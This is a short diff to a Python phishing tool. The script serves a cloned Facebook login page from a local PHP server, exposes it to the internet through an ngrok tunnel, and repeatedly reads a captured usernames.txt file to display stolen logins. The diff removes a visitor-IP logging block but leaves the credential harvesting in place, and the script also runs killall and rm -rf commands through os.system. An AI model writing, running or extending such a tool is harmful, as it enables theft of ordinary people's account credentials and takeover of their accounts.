@@ -3,8 +3,6 @@ os.system("chmod +x Abir/ngrok*")
 os.system("killall php> /dev/null 2>&1")
 os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
-#os.system("chmod +x./ngrok")
-#os.system("cd $HOME/aa/Abir && chmod +x ngrok")
 time.sleep(10)
 os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
@@ -18,13 +16,6 @@ for i in datajson['tunnels']:
 os.system('clear')
 print (msg)
 while True:
-	if os.path.isfile("/aa/site/ip.txt")==True:
-		tr=open("/aa/site/ip.txt","r")
-		ip2=tr.readline()
-		ip=tr.readline().strip("IP:")
-		print("\n [>] A User Visited the Site From IP : "+ip)
-		tr.close()
-		os.system("rm -rf  aa/site/ip.txt")
 	if os.path.isfile("/aa/site/facebook/usernames.txt")==True:
 	 #time.sleep(0.75)
 		tr2=open("/aa/site/facebook/usernames.txt","r")
